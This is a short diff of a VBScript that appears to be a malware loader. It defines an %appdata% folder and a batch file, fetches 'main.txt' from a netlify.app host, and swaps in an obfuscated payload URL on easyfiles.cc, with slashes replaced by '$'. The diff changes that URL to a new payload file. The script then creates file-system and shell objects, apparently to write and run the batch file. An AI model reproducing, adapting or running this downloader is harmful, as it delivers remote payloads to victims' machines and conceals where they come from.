@@ -4,7 +4,7 @@ Const appFolder = "%appdata%\paged-l"
 Const batchFile = "%appdata%\paged-l\special.bat"
 Const srcUrl = "https://aesthetic-parfait-d56344.netlify.app/main.txt"
 Const placeholder = "****"
-Const replUrl = "https:$$easyfiles.cc$2025$11$c41f859f-c075-4fce-ae65-c87f6ba28e81$pld.txt"
+Const replUrl = "https:$$easyfiles.cc$2025$11$d36f47a2-d16d-40c6-a0b8-2d586d13beec$xxx.txt"
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
